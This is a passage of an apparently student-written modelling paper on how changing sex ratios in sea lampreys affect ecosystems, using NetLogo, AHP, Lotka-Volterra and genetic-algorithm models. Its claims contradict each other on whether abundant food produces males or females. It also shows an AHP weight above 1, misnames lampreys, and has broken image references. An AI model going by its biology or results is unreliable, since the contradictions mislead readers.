<strong>Summary</strong></h3>\n<p>In this study, we first innovatively constructed a dynamic simulated ecological environment through the <em><strong>*Netlogo model*</strong></em>, and thoroughly investigated the multifaceted impacts of changes in the sex ratio of seven-gill eels on the entire ecosystem. Then we used a variety of models and methods to synthesize the analysis around research questions I to IV.</p>\n<p>For problem 1: We use analytic Hierarchy Process (AHP) and LA model to quantify the relationship between various factors and study the multi-level impact of sex ratio change on the ecosystem. Through AHP, we derive the weight allocation of the impact of sex ratio changes on the ecosystem, while the LA model optimizes the decision-making process. The results show that changes in <strong>sex ratio significantly affect adaptation</strong>, resource utilization and species diversity, and provide a key ecological balance mechanism for the system.</p>\n<p>For problem 2: Using a comprehensive evaluation method and genetic algorithm, we considered the advantages and disadvantages of the lamprey population in a comprehensive manner. Through the parameter optimization of the genetic algorithm, we gained a deeper understanding of the advantages of the dynamic adjustment of the sex ratio of the lamprey on its own reproductive growth. By cross-corroborating the two models, we conclude that the ecological advantages of dynamically adjusting the sex ratio far outweigh the disadvantages. <strong>The ecological adaptations and advantages demonstrated by lampreys through the flexible adjustment of sex ratios dominate in maintaining ecosystem balance and diversity.</strong></p>\n<p>For problem 3: Using the eigenvalue method of differential equation combined with Jacobian matrix, we deeply discuss the effect of sex ratio change on ecosystem stability. Eigenvalue analysis reveals the key role of sex ratio in maintaining ecosystem stability. Our conclusion emphasizes that the change of sex ratio is an important factor in the dynamic balance of ecosystems and provides scientific basis for ecological conservation and management.</p>\n<p>For problem 4: Using system dynamics and ecosystem interaction models, we comprehensively consider the complex relationships between lampreys and other species. By simulating ecological interactions under different scenarios, <strong>we found that changes in sex ratios have positive effects on other species and maintain the relative balance of the entire ecosystem.</strong></p>\n<p>Sensitivity analysis: We conducted an in-depth sensitivity analysis of all models to verify the reliability of the models in different scenarios. The steps of sensitivity analysis involve a systematic study of changes in the key parameters of each model. In the AHP and LA models, we adjusted the weights and decision parameters and simulated different decision scenarios to assess the sensitivity of the models to changes in the sex ratio. For the comprehensive evaluation method and the genetic algorithm, we vary the operational parameters of the genetic algorithm, such as the crossover rate and the mutation rate, and observe the optimization results of the population under different parameter Settings. In differential equations combined with Jacobian matrix, system dynamics and ecosystem interaction models, we adjusted the key parameters in the equations to evaluate the model's response to changes in sex ratio by simulating ecological dynamic processes under different conditions. This series of sensitivity analysis helps to identify the key factors affecting the results in each model, and provides strong support for the reliability and robustness of the model.</p>\n<p>Pros and cons evaluation and outlook: All models are comprehensively evaluated, and the advantages and disadvantages of each model are summarized. Despite some simplifications and assumptions, these models provide insights into understanding the combined effects of changes in lampreys' sex ratios on ecosystems. Looking to the future, the authenticity and reliability of the model can be further improved by introducing more ecological parameters and field observation data to support more accurate ecological management.</p>\n<h4 id=\"keywords\"><a class=\"anchor\" href=\"#keywords\">#</a> Keywords</h4>\n<p>Lampreys, sex ratio change,Netlogo, Analytic Hierarchy Process, Lotka-Volterra model, Comprehensive evaluation Method, Genetic algorithm, Jacobian Matrix and eigenvalues, System dynamics, ecosystem interaction model</p>\n<p><em><strong>*Contents*</strong></em></p>\n<p><a href=\"#_Toc15523\">1  Introduction\t</a></p>\n<p><a href=\"#_Toc13865\">1.1  Background\t</a></p>\n<p><a href=\"#_Toc16722\">1.2  Problem Restatement and Analysis\t</a></p>\n<p><a href=\"#_Toc32468\">1.3  Overview of our work\t</a></p>\n<p><a href=\"#_Toc5833\">2  Assumptions\t</a></p>\n<p><a href=\"#_Toc21803\">3  List of Notation\t</a></p>\n<p><a href=\"#_Toc24626\">4  Preliminary conclusions obtained by Netlogo simulation\t</a></p>\n<p><a href=\"#_Toc8651\">4.1 Preliminary setting\t</a></p>\n<p><a href=\"#_Toc21863\">4.2 Netlogo solves problem one, two, three, four\t</a></p>\n<p><a href=\"#_Toc12299\">5  Effect of variable sex ratio in lampreys on bigger ecosystem\t</a></p>\n<p><a href=\"#_Toc25511\">5.1  Analytic Hierarchy Process (AHP)\t</a></p>\n<p><a href=\"#_Toc21101\">5.2  Lotka-Volterra model\t</a></p>\n<p><a href=\"#_Toc11452\">5.3  Conclusion\t</a></p>\n<p><a href=\"#_Toc8089\">6 Advantages and disadvantages of variable sex ratio for lampreys populations\t</a></p>\n<p><a href=\"#_Toc8339\">6.1 Integrated assessment method\t</a></p>\n<p><a href=\"#_Toc13350\">6.2  Genetic Algorithm\t</a></p>\n<p><a href=\"#_Toc3157\">6.3  Conclusion\t</a></p>\n<p><a href=\"#_Toc1986\">7  Effects of variable sex ratio of lamprey on ecosystem stability\t</a></p>\n<p><a href=\"#_Toc4989\">7.1  Not considering the prey of lampreys\t</a></p>\n<p><a href=\"#_Toc6259\">7.2  Consider the prey of lampreys\t</a></p>\n<p><a href=\"#_Toc27275\">7.3  Conclusion\t</a></p>\n<p><a href=\"#_Toc1288\">8  Effects of variable sex ratio in lampreys on other species\t</a></p>\n<p><a href=\"#_Toc10293\">8.1  System Dynamics\t</a></p>\n<p><a href=\"#_Toc14325\">8.2  Ecological Interaction Model\t</a></p>\n<p><a href=\"#_Toc26957\">8.3  Conclusion\t</a></p>\n<p><a href=\"#_Toc3631\">9  Sensitivity Analysis\t</a></p>\n<p><a href=\"#_Toc9399\">9.1  AHP sensitivity analysis\t</a></p>\n<p><a href=\"#_Toc452\">9.2 Lotka-Volterra sensitivity analysis\t</a></p>\n<p><a href=\"#_Toc14368\">9.3  Comprehensive assessment sensitivity analysis\t</a></p>\n<p><a href=\"#_Toc24121\">9.4  Sensitivity analysis of genetic algorithm\t</a></p>\n<p><a href=\"#_Toc15186\">9.5 Sensitivity testing of eigenvalue models using differential equations\t</a></p>\n<p><a href=\"#_Toc29957\">9.6  Sensitivity analysis of system dynamics\t</a></p>\n<p><a href=\"#_Toc22371\">9.7 Sensitivity analysis of ecological interactions model\t</a></p>\n<p><a href=\"#_Toc14997\">10  Model Evaluation and Further Discussion\t</a></p>\n<p><a href=\"#_Toc2058\">10.1  Question One\t</a></p>\n<p><a href=\"#_Toc14527\">10.2  Question Two\t</a></p>\n<p><a href=\"#_Toc8408\">10.3  Question Three\t</a></p>\n<p><a href=\"#_Toc27028\">10.4  Question Four\t</a></p>\n<p><a href=\"#_Toc32058\">11 Reference\t</a></p>\n<h1 id=\"1-introduction\"><a class=\"anchor\" href=\"#1-introduction\">#</a> <strong>1  Introduction</strong></h1>\n<h2 id=\"11-background\"><a class=\"anchor\" href=\"#11-background\">#</a> <strong>1.1  Background</strong></h2>\n<p><em><strong>*Sea lampreys*</strong></em> live in lake or sea habitats and migrate up rivers to spawn, which have unique position in the study of biology and ecology. Both predatory and parasitic relationships.</p>\n<p>One of the most striking features for lampreys is that their sex can vary according to resource availability. In environments where food is plentiful and growing conditions are favorable, larvae are more likely to develop into larger females, while in environments where resources are scarce, larvae tend to develop into smaller males.This mechanism of sex change may be an adaptive evolutionary strategy that allows the lampreys to adjust its sex ratio to environmental conditions to optimize reproductive success and resource use efficiency.</p>\n<p>The task focus the sex ratios of sea lampreys under resource availability can provide insights into biological adaptation, sex determination, and ecosystem management.</p>\n<h2 id=\"12-problem-restatement-and-analysis\"><a class=\"anchor\" href=\"#12-problem-restatement-and-analysis\">#</a> <strong>1.2  Problem Restatement and Analysis</strong></h2>\n<p><em><strong>*Problem One:*</strong></em> What are the overall effects of adjusting the sex ratio of lampreys populations on the entire ecosystem? This requires us to explore how changes in sex ratios shape the ecological role of lampreys in the wider ecosystem, and to fully understand ecosystem interrelationships through modeling and analysis.</p>\n<p><em><strong>*Problem Two:*</strong></em> What are the advantages and disadvantages of the changing sex ratio for Lampreys? This requires a systematic assessment of the effects of sex ratio adjustment, including advantages such as adaptation, population control and genetic diversity, as well as disadvantages such as fluctuations in reproductive rate and competition for resources.</p>\n<p><em><strong>*Problem Three:*</strong></em> How do changes in the sex ratio collectively affect the stability of the entire ecosystem? Differential equations and Jacobian matrices can be used to explore the effects of sex ratio changes on ecosystem stability, especially when considering factors such as parasites.</p>\n<p><em><strong>*Problem Four:*</strong></em> Do lamprey ecosystems with changing sex ratios have an overall advantage over other species, such as parasites? System dynamics and ecological interaction models can be used to further study the combined effects of sex ratio changes on other species, including advantages in terms of stability, adaptation and niche differentiation.</p>\n<h2 id=\"13-overview-of-our-work\"><a class=\"anchor\" href=\"#13-overview-of-our-work\">#</a> <strong>1.3  Overview of our work</strong></h2>\n<p>To avoid complicated description, intuitively reflect our work process, the flow chart is show as the following figure:</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/RvtpDkwnb6fghdl.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 1 Our working flow chart*</strong></em></p>\n<h1 id=\"2-assumptions\"><a class=\"anchor\" href=\"#2-assumptions\">#</a> <strong>2  Assumptions</strong></h1>\n<p><em><strong>*Assumption 1*</strong></em>: The growth of the lamprey population approximately follows the Logistic model, with a maximum number allowed by environmental conditions, i.e., the carrying capacity K. The environmental resistance to the lamprey population increases proportionally with population density.</p>\n<p><em><strong>*Assumption 2*</strong></em>: We only consider parasitic marine lampreys, whose juvenile lampreys feed on plankton and are preyed upon by fish and birds, and adults parasitize large fish, with parasitism actions reducing the survival and reproductive capabilities of the host fish.</p>\n<p><em><strong>*Assumption 3*</strong></em>: The sex of lampreys is directly influenced by the amount of food resources acquired during the larval stage in a linear manner.</p>\n<p><em><strong>*Assumption 4*</strong></em>: It is assumed that the number of male lampreys always exceeds that of female lampreys in the natural environment, and the birth rate is proportionally related to the female sex ratio. <em><strong>*Justification*</strong></em>: The data shows that the sex ratio of adult lamprey populations almost always has more males than females. Hadisty and Potter (1971) found that this ratio varies from nearly equal to males nearly five times that of females. Knowing that both male and female lampreys die immediately after mating and spawning, it suggests that lampreys mate only once in their lifetime. The higher the female ratio, the higher the birth rate.</p>\n<h1 id=\"3-list-of-notation\"><a class=\"anchor\" href=\"#3-list-of-notation\">#</a> <strong>3  List of Notation</strong></h1>\n<p><strong>Table 1: Notations used in this paper</strong></p>\n<table>\n<thead>\n<tr>\n<th><em><strong>*Symbol*</strong></em></th>\n<th><em><strong>*Description*</strong></em></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>A</td>\n<td>large ecosystem</td>\n<td></td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps1.jpg)</td>\n<td>Ecological balance, biodiversity, energy flow</td>\n<td></td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps2.jpg)</td>\n<td>Population characteristics of lampreys</td>\n<td></td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps3.jpg)</td>\n<td>Ecosystem impact factors</td>\n<td></td>\n</tr>\n<tr>\n<td>W</td>\n<td>Composite for initial evaluation of question two_ Indicator</td>\n<td></td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps4.jpg)</td>\n<td>Question three: Interactions between predators and prey</td>\n<td></td>\n</tr>\n<tr>\n<td>SR</td>\n<td>Sex Ratio</td>\n<td></td>\n</tr>\n<tr>\n<td>FA</td>\n<td>Food Availability</td>\n<td></td>\n</tr>\n<tr>\n<td>RR</td>\n<td>Reproductive Rate</td>\n<td></td>\n</tr>\n<tr>\n<td>P</td>\n<td>Predtion</td>\n<td></td>\n</tr>\n<tr>\n<td>HU![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps5.jpg) ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps6.jpg) ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps7.jpg) ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps8.jpg)</td>\n<td>Habitat Utilizationpopulation size of the lampreysintrinsic growth rate of the lamprey populationcarrying capacity of the lamprey populationthe intrinsic growth rate of the parasite population</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"4-preliminary-conclusions-obtained-by-netlogo-simulation\"><a class=\"anchor\" href=\"#4-preliminary-conclusions-obtained-by-netlogo-simulation\">#</a> <strong>4</strong>  <strong>Preliminary conclusions obtained by</strong> <strong>N****etlogo simulation</strong></h1>\n<h2 id=\"41-preliminary-setting\"><a class=\"anchor\" href=\"#41-preliminary-setting\">#</a> <strong>4.1</strong> <strong>Preliminary setting</strong></h2>\n<p>Our time was refreshed by 0.1s. In our analysis and solution, we found that netlogo virtual simulation software could be used to simulate a simplified version of the fish ecosystem to initially judge a series of effects of the changes in the sex ratio of lampreys. We first set a series of conditions on netlogo with code: the color of the male lampreys is pink, and the initial energy is a random number of 6 to 16. Female Lampreys are red in color and have an initial energy of a random number from 1 to 10. Male lampreys have a feeding efficiency of 35% and female lampreys have a feeding efficiency of 20%. The color of the lake trout is blue, the energy is set to infinity (relative to the lampreys), and the initial number is set to 1/5 of the total number of lampreys, which can continuously gain energy on the lake trout. We set the color of the bacteria to purple, the initial number to 200, the reproduction rate to 2000%, carrying energy 0.5. The algae are green in color, have an initial number of 50, a reproductive rate of 2500%, and carry energy 2. We set the lampreys to consume 0.5 per step, and they die when they reach negative energy. Lampreys can reproduce at a specified time (time lapse mod40=30~40), when any two lampreys of the opposite sex can mate and produce 12~18 small white fish, both parents die immediately after producing offspring. Baby Lampreys have a 75% chance of dying as they grow. If the baby lampreys survive mod40&gt;10, they can be transformed into male or female lampreys depending on the amount of food resources around them. The specific rules are as follows:When there is plenty of food around (algae + fungi + lake trout more than 60% of the area), small fish are 56% more likely to become male.When there is not enough food around (algae + fungi + lake trout less than 30% of the area) the small fish are 78% more likely to become female lampreys.The proportion of small fish becoming males varies linearly between 56% and 78% according to the resource area.We also created human fishing rules, and we set the environment for lampreys to be able to sustain K.When the number of lampreys is greater than K of the square root of two fractions, humans catch 40-60% of lampreys at a time (of which 10% are juveniles, 60% are females, and 30% are males).</p>\n<p>Based on this preliminary setting, the dynamic changes of lampreys are simulated to derive the initial trend.</p>\n<h2 id=\"42-netlogo-solves-problem-one-two-three-four\"><a class=\"anchor\" href=\"#42-netlogo-solves-problem-one-two-three-four\">#</a> <strong>4.2</strong> <strong>Netlogo solves problem one, two, three, four</strong></h2>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/Qf9pvxKleIPXZ5U.png\" alt=\"image.png\" /></p>\n<p><strong>Picture 2 Dynamic simulation of each element with netlogo</strong></p>\n<p>As for problem 1, the larger ecosystem can be determined by the total resources and human predation. When lampreys can dynamically adjust their energy change according to the resource ratio, and when we adjust the sex ratio of lampreys from 56% to 78%, the curve shows that the total resources of the ecosystem are basically unchanged after 50 iterations.</p>\n<p>For the analysis of problem 2, when we remove the effect that lampreys can dynamically adjust the sex ratio with respect to the surrounding resources, we find that the total resources of the ecosystem and the total amount of lampreys both show a downward trend. It turns out that lampreys' ability to adjust their sex ratio helps them grow and compete.</p>\n<p>For question 3, we found that when lampreys were able to adjust their sex ratio, the human catch would first remain at a stable value. Secondly, the total energy of the ecosystem will remain basically consistent, and the stability of species diversity will be effectively guaranteed.</p>\n<p>In response to question 4, we found that changes in the sex ratio of lampreys populations not only ensure the adaptability of host populations and the diversity of ecological niches, but also provide opportunities for parasite populations to stabilize and grow. Therefore, we can reasonably infer that this change in sex ratio does provide ecological advantages to other species such as parasites, especially in terms of stability and adaptability. This advantage may be critical to maintaining the overall health and diversity of the ecosystem.</p>\n<h1 id=\"5-effect-of-variable-sex-ratio-in-lampreys-on-bigger-ecosystem\"><a class=\"anchor\" href=\"#5-effect-of-variable-sex-ratio-in-lampreys-on-bigger-ecosystem\">#</a> <strong>5  E****ffect of variable</strong> <strong>sex ratio</strong> <strong>in lampreys on</strong> <strong>bigger ecosystem</strong></h1>\n<h2 id=\"51-analytic-hierarchy-process-ahp\"><a class=\"anchor\" href=\"#51-analytic-hierarchy-process-ahp\">#</a> <strong>5.1</strong>  <strong>Analytic Hierarchy Process (AHP)</strong></h2>\n<h3 id=\"511-model-establishment\"><a class=\"anchor\" href=\"#511-model-establishment\">#</a> <strong>5.1.1  Model</strong> <strong>Establishment</strong></h3>\n<p>In hierarchical analysis, we hierarchized the problem as influencing the macroecosystem in terms of orientation (A), ecological balance (B1), biodiversity (B2), energy flow (B3), population size (C1), changes in sex ratios (C2), birth mortality rate (C3), natural and anthropogenic influences (D1), food abundance (D2), hatchery environmental conditions (D3), the waters of the effects of other organisms (D4), seasonal variation (D5), water quality conditions (D6), and temperature effects (D7). At the same time, we establish the hierarchical diagram as follows:</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/thozAHl7Te5rLSM.png\" alt=\"image.png\" /></p>\n<p>Created a judgment matrix B=<img data-src=\"https://s2.loli.net/2024/07/04/TdbYR2tOpgFqM3D.png\" alt=\"image.png\" /></p>\n<p>C=<img data-src=\"https://s2.loli.net/2024/07/04/Jys8Rn75Qbxl4rY.png\" alt=\"image.png\" /></p>\n<p>We calculate the weight vector of B from the code as [0.93103448 0.03448276 0.03448276]</p>\n<p><strong>A hierarchical general ordering table for B and C is then created as follows.</strong></p>\n<p><strong>Table 2</strong> <strong>A hierarchical general ordering table for B and C</strong></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/IzAZyiaDh7uO3Bq.png\" alt=\"image.png\" /></p>\n<p>Also we get the judgment matrix of D under C1~3</p>\n<p>Table 3 The judgment matrix of D when C1, C2, and C3 are fixed respectively</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/YZz6fTC2N4mawUX.png\" alt=\"image.png\" /></p>\n<h3 id=\"512-model-solution\"><a class=\"anchor\" href=\"#512-model-solution\">#</a> <strong>5.1.2  Model solution</strong></h3>\n<p>For <em><strong>*C*</strong></em><em><strong>*1*</strong></em><em><strong>*, C*</strong></em><em><strong>*2*</strong></em><em><strong>*, and C*</strong></em><em><strong>*3*</strong></em> fixed we compute the weight vectors D****1~7**** to get the following table.Multiplying the weights of criterion layer 2 by the coefficients, i.e., multiplying the individual influences by the criterion layer weights, yields:</p>\n<p><em><strong>*Table 4*</strong></em> <em><strong>*table of total weights*</strong></em></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/uipg9FsTJ2ZoV5d.png\" alt=\"image.png\" /></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/rq3dpSFUvyzCkcD.png\" alt=\"image.png\" /></p>\n<p>​                <em><strong>*Picture 4*</strong></em>\t<em><strong>*Various factors affect the heat map*</strong></em></p>\n<h3 id=\"513-results-and-analysis\"><a class=\"anchor\" href=\"#513-results-and-analysis\">#</a> <strong>5.1.3  Results and Analysis</strong></h3>\n<p>As can be seen from the above table:</p>\n<p>（i）The population dynamics of lampreys were greatly affected by the change of sex ratio, followed by the population size. Changes in the sex ratio may directly affect the growth and dynamics of the population. At the same time, species such as lampreys may have complex social structures and behavioral patterns, including courtship behavior and breeding seasons. In these social structures, changes in the sex ratio may cause changes in behavior patterns and dynamics within the population, thus affecting the stability and dynamics of the entire population. Changes in lamprey population size can be relatively stable, as ecosystems usually have a certain carrying capacity. It can be seen from the weight table that the weight of gender ratio in layer C is the highest (1.137930), so the influence of gender ratio on many levels cannot be ignored.</p>\n<p>（ii）It can be seen from the heat map that the sex ratio has the largest or larger influence on the other seven factors, so the sex ratio can affect the population dynamics of lampreys by influencing, for example, the population size of lampreys, the population size of lampreys and the birth mortality rate of lampreys. The change of lampreys population dynamics not only has an impact on the ecological balance and energy flow of the ecosystem, but also has a strong impact on the activities of other organisms. In our view, this effect is positive for the larger ecosystem, which is conducive to improving the stability of the larger ecosystem. In order to keep the energy of the large ecosystem in a specific range, and dynamically regulate the ecological balance and biodiversity to maintain a stable range.</p>\n<h2 id=\"52-lotka-volterra-model\"><a class=\"anchor\" href=\"#52-lotka-volterra-model\">#</a> <strong>5.2</strong>  <strong>Lotka-Volterra model</strong></h2>\n<h3 id=\"521-model-assumptions\"><a class=\"anchor\" href=\"#521-model-assumptions\">#</a> <strong>5.2.1  Model</strong> <strong>Assumptions</strong></h3>\n<p>Our model is predicated on the ecological premise that the sex ratio of marine lamprey populations is a variable trait influenced by environmental factors such as food availability. In our assumptions, we consider the following variables:</p>\n<p>Sex Ratio (SR): A continuum from 0 (all male) to 1 (all female), affecting reproductive rates and predation dynamics.</p>\n<p>Food Availability (FA): A key factor influencing the sex ratio and growth rates within the lamprey population.</p>\n<p>Reproductive Rate (RR): Tied to the sex ratio, determining the potential for population increase.</p>\n<p>Predation (P): Reflecting the food chain's impact, with humans as a primary predator, influencing lamprey survival rates.</p>\n<p>Habitat Utilization (HU): The lampreys' response to environmental conditions, which may affect their migratory and spawning behaviors.</p>\n<p>These factors form the basis of our ecological simulation, where we seek to understand how adaptive changes in sex ratio can affect the broader ecosystem in terms of resource allocation, population dynamics, and overall ecological balance.</p>\n<h3 id=\"522-model-establishment\"><a class=\"anchor\" href=\"#522-model-establishment\">#</a> <strong>5.2.2  Model</strong> <strong>Establishment</strong></h3>\n<p>For codes 1.1 to 1.6, we utilized polynomial fitting to model the impact of sex ratio changes on various ecological variables. The polynomial fitting is an analytical approach used to model relationships between variables in a system where linear assumptions are inadequate. In our case, we use a 3rd degree polynomial to fit the relationship between the gender ratio and food supply, which can be expressed as:</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/1Cy8LJnxFjYIPv6.png\" alt=\"image.png\" /></p>\n<p>Where:</p>\n<p><strong>N</strong> is the prey population (lampreys), <strong>P</strong> is the predator population (humans),<strong>r</strong> is the intrinsic growth rate of the prey,<strong>K</strong> is the carrying capacity of the prey,</p>\n<p><strong>α</strong> is the predation rate coefficient,</p>\n<p><strong>β</strong> is the growth rate coefficient of predators,</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps9.jpg) is the death rate of predators.</p>\n<p>These equations allow us to model the dynamic feedback loop where the prey's growth is limited by the carrying capacity and predation, while the predator's growth is fueled by the successful capture of prey but tempered by their own mortality.</p>\n<p>In your code for code 1.7, the variables are adjusted to reflect the influence of food availability on gender ratio and its subsequent impact on reproductive success and food resource sustainability. The simulation captures how the lamprey population, when considered as prey, is affected by the changing sex ratios and how this, in turn, affects the predator population over time.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/RP9Wc78TpkAadhU.png\" alt=\"image.png\" /></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/pUNxry97tlmoa4z.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 5 Simulated Gender Ratio in Response to Food Availability  Picture 6 The effect of sex ratio on different variables*</strong></em></p>\n<h3 id=\"523-conclusions\"><a class=\"anchor\" href=\"#523-conclusions\">#</a> <strong>5.2.3</strong> <strong>Conclusions</strong></h3>\n<p>Our model suggests that the marine lamprey's capacity to modify its sex ratio is a significant evolutionary adaptation with profound implications for the ecosystem. An optimal sex ratio can enhance reproductive success, fortify the species' position in the food chain, and improve the sustainable use of food resources. However, these benefits are not without their drawbacks; imbalances may expose the population to increased predation pressure and reproductive challenges, particularly in the face of environmental stressors such as overfishing and habitat degradation.</p>\n<p>In conclusion, the marine lamprey's ability to alter its sex ratio in response to environmental conditions underscores a delicate ecological dance of adaptability and vulnerability. This balancing act is critical to the maintenance of ecosystem health, offering a window into the complex interdependencies that govern life within our waterways. Our findings shed light on the pivotal role that sex ratio variability plays in ecological resilience and resource management, providing key insights for the conservation and management of these unique species.</p>\n<h2 id=\"53-conclusion\"><a class=\"anchor\" href=\"#53-conclusion\">#</a> <strong>5.3  Conclusion</strong></h2>\n<p>Combining the results of the two models, we conclude that the species has the adaptive sex ratio adjustment ability, which has a profound impact on the ecosystem. An optimal sex ratio enhances reproductive success, strengthens the position of species in the food chain, and enhances the sustainable use of food resources. However, this adaptation also brings challenges, and an unbalanced sex ratio can increase predation pressures and reproductive challenges faced by populations, especially in the presence of environmental pressures such as overfishing and habitat degradation.</p>\n<p>Overall, the ray population shows a delicate balance between adaptability and vulnerability in the ecosystem through sex ratio adjustment. This balance is critical to maintaining ecosystem health and provides a window into the complex interdependencies of life in our waters. Our study reveals the key role of sex ratio variation in ecological resilience and resource management, providing important insights into the conservation and management of these unique species.</p>\n<h1 id=\"6-advantages-and-disadvantages-of-variable-sex-ratio-for-lampreys-populations\"><a class=\"anchor\" href=\"#6-advantages-and-disadvantages-of-variable-sex-ratio-for-lampreys-populations\">#</a> <strong>6</strong> <strong>Advantages and disadvantages of</strong> <strong>variable</strong> <strong>sex ratio for lampreys populations</strong></h1>\n<h2 id=\"61-integrated-assessment-method\"><a class=\"anchor\" href=\"#61-integrated-assessment-method\">#</a> <strong>6.1</strong> <strong>I****ntegrated assessment method</strong></h2>\n<h3 id=\"611-model-estabilishment\"><a class=\"anchor\" href=\"#611-model-estabilishment\">#</a> <strong>6.1.1  Model Estabilishment</strong></h3>\n<p>According to the Netlogo fitting results in point 4 we can see the advantage of the seven-gill eel that can dynamically regulate its sex ratio:</p>\n<p><em><strong>*Adaptable:*</strong></em> the ability to adjust the sex ratio to environmental conditions improves the ability to survive and reproduce in resource-limited environments.</p>\n<p><em><strong>*Population control:*</strong></em> By adjusting the sex ratio, lampreyeels are able to control their population size more effectively and reduce excessive competition.</p>\n<p><em><strong>*Genetic diversity:*</strong></em> changing sex ratios may promote genetic diversity and thus increase the adaptive capacity of populations.</p>\n<p>The disadvantages are：</p>\n<p><em><strong>*Fluctuations in reproductive rates:*</strong></em> If one sex is too dominant in a given environment, this may lead to a reduction in reproductive opportunities, affecting the long-term stability of the population.</p>\n<p><em><strong>*Competition for resources:*</strong></em> Changing sex ratios may exacerbate same-sex competition, especially if food or mates are limited.</p>\n<p>Through academic search on google, we built a comprehensive evaluation model after borrowing the paper of William D. Swink.[1]: firstly, we set up the number of initial predators, reproductive success, reproduction process, predation rate, and food resources, and then we set up the parameters to simulate the different sex ability and species change of the lampreyeel, and to simulate the population change of predators and so on.</p>\n<p>The initial evaluation indicator is obtained in our code by W = 0.4 * gender_ratio[gen] + 0.3 * predator_population[gen] + 0.2 * reproductive_success[gen] + 0.1 * food_resources[gen].</p>\n<p>The probability of predation on lampreyP = 0.2*(1-gender_ration[gen ]) to represent the effect of the gender shift on the lampreypopulation.</p>\n<p>The following code iterates the W loop 50 times.</p>\n<p>Then set the weights of the eight variables, i.e.Predation Control=0.2*![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps10.jpg)、Food Chain Role=![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps11.jpg)<em>0.3、Adaptability=![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps12.jpg)<em>0.1、Predation Threat=0.1</em>random(0.1,0.2)、Reproduction Threat=0.2</em>random(0.2,0.5)、Overfishing Risk=0.4<em>random(0.4,0.8)、Environmental Pressure=0.1</em>(0.1,0.5)，ecosystem_provider=0.2*![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml8880\\wps13.jpg)</p>\n<p>Data Setting Analysis:We set the weight of transitional predation by humans to 0.4 and used a random function (0.4,0.8) for the parameter settings, this is due to the fact that human fishing is the main cause of mortality in lampreyeels. Then we set the weight of reproductive threat to 0.2 and the random number set to (0.2,0.5), this is due to the fact that the juvenile mortality of the lampreyeel is also to important cause. And according to William's article, setting Adaptability to the standard deviation of W is necessary. Setting the role of the lampreyeel in the food chain as the maximum value of W, which can reflect the status of the lampreyeel. And his Predation Control set to the mean value of W also responds well to the function of the seven-gill eel. Here the total energy provided by the ecosystem is recorded as the cumulative sum of W.</p>\n<p>The final comprehensive evaluation equation is  <strong>overall_score=</strong><img data-src=\"https://s2.loli.net/2024/07/04/fURQqInYcloaB6C.png\" alt=\"image.png\" />,X for the factors mentioned above.</p>\n<h3 id=\"612-results-and-analysis\"><a class=\"anchor\" href=\"#612-results-and-analysis\">#</a> <strong>6.1.2 Results and Analysis:</strong></h3>\n<p>The results demonstrated that with the output of the model, we output the sex ratio in the 21 cases of (0,1,0.05) which is overall_score with the specific values of the eight factors and plotted the heat map between the models.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/2ubCiAYfn7Mc1kj.png\" alt=\"image.png\" /><img data-src=\"https://s2.loli.net/2024/07/04/VL2Dcsf4rJmaP7h.png\" alt=\"image.png\" /><img data-src=\"https://s2.loli.net/2024/07/04/WrBImgHf9hquVdk.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture 9 Thermal map representation of the relationship between the influencing factors*</strong></em></p>\n<p>Through comprehensive evaluation, we can see that, first of all, we observe picture 7, where the food Chain Role increases with the increase of male proportion, which is caused by the fact that males of lampreys have a stronger ability to obtain resources than females. When lampreys have fewer resources or are attacked by predators, increasing the male ratio helps them reduce mortality and improve their status in the ecological chain. Secondly, we pay attention to the change of predation control. In the range of male possibility value (greater than 50%) of lampreys, the threat of predation slowly decreases with the increase of male proportion. Finally, we pay attention to the change of environmental pressure, and we can see that the environmental pressure decreases with the increase of male proportion after 50%, which also means that the environmental pressure on lampreys decreases with the increase of male proportion. And as you can see from Picture 8, the total resources of the ecosystem do not change as the proportion of male lampreys increases, which means that the ecological balance will not be affected, but the adaptability of lampreys will be enhanced.</p>\n<p>So let's look at the last line of the heat map. It can be seen that the male ratio of lampreys is correlated with all factors, with the strongest correlation for favorable factors, which is shown in red in the figure. However, the association with adverse factors was small, suggesting that an increase in the sex ratio of lampreys can effectively enlarge its beneficial effects and reduce its adverse effects.</p>\n<p>According to our analysis, the most important advantage of regulating the sex ratio of lampreys is to increase the net birth rate: when food is scarce, an increase in the proportion of males reduces the competition for food and improves the success of mating, and when food is abundant, an increase in the proportion of females increases the number of eggs laid and thus the number of 